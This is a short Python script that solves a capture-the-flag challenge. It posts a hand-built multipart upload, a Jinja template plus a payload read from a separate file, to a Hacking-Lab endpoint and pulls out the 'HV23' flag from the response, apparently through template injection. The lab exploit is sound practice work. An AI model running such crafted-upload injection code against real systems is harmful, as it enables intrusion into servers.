import requests, re

with open('file.jinja', 'r') as f:
    file = f.read()

with open('payload.py', 'r') as f:
    payload = f.read()

url = "https://xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx.rdocker.vuln.land:443/upload"
headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "multipart/form-data; boundary=----"}
data = "------\r\nContent-Disposition: form-data; name=\"template\"; filename=\"file.jinja\"\r\nContent-Type: application/octet-stream\r\n\r\n"+file+"\r\n------\r\nContent-Disposition: form-data; name=\"fieldNames[]\"\r\n\r\na\r\n------\r\nContent-Disposition: form-data; name=\"descriptions[]\"\r\n\r\n"+payload+"\r\n------\r\nContent-Disposition: form-data; name=\"fields\"\r\n\r\n[{\"name\":\"a\",\"description\":\""+payload+"\"}]\r\n--------\r\n"
print(re.findall(r'(HV23\{\w.*?\})', requests.post(url, headers=headers, data=data).text)[0])